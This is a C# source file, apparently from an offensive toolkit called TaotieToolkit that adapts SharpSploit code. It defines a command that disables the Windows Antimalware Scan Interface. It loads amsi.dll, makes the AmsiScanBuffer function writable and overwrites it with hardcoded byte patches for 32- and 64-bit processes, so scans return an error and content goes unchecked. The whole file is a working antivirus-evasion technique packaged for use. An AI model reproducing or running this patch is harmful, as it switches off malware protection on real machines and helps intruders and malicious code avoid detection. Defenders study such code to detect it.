// Author: Ryan Cobb (@cobbr_io)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using System;
using System.Runtime.InteropServices;
using Utils.PlatformInvoke;
using TaotieToolkit;
using TaotieToolkit.config;

namespace TaotieToolkit
{
    /// <summary>
    /// Amsi is a class for manipulating the Antimalware Scan Interface.
    /// </summary>
    public class PatchAmsiScanBuffer : ICommand, ICommandMarker
    {
        public string Name => "PatchAmsiScanBuffer";
        public string Description => "Patch the AmsiScanBuffer function in amsi.dll.";

        public void Execute(string[] args)
        {
            byte[] patch;
            if (Utils.Is64Bit)
            {
                patch = new byte[6];
                patch[0] = 0xB8;
                patch[1] = 0x57;
                patch[2] = 0x00;
                patch[3] = 0x07;
                patch[4] = 0x80;
                patch[5] = 0xc3;
            }
            else
            {
                patch = new byte[8];
                patch[0] = 0xB8;
                patch[1] = 0x57;
                patch[2] = 0x00;
                patch[3] = 0x07;
                patch[4] = 0x80;
                patch[5] = 0xc2;
                patch[6] = 0x18;
                patch[7] = 0x00;
            }

            try
            {
                var library = Win32.Kernel32.LoadLibrary("amsi.dll");
                var address = Win32.Kernel32.GetProcAddress(library, "AmsiScanBuffer");
                uint oldProtect;
                Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, 0x40, out oldProtect);
                Marshal.Copy(patch, 0, address, patch.Length);
                Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, oldProtect, out oldProtect);

                Console.WriteLine("[*] AMSI patched Sucess.");
            }
            catch (Exception e)
            {
                Console.WriteLine("\t[-] AMSI patch failed,exception:" + e.Message);

            }
        }
     
    }
}